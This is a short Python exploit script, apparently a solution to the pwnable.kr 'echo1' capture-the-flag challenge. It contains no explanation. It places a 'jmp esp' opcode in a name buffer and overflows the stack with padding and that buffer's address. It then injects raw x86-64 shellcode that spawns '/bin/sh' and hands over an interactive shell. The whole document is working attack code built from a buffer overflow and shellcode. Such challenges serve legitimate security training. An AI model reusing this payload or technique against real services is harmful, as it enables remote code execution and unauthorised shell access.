from zio import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './echo1'
target  = ('pwnable.kr', 9010)

io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
io.gdb_hint([0x00400871])

io.read_until("hey, what's your name? : ")
opcode_jmp_esp  = '\xff\xe4'
io.writeline(opcode_jmp_esp)

io.read_until('> ')
io.writeline('1')
io.readline()

adr_id      =   0x6020a0
shellcode   = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

payload =   'A' * 40
payload +=  l64(adr_id)
payload +=  shellcode
io.writeline(payload)

io.interact()
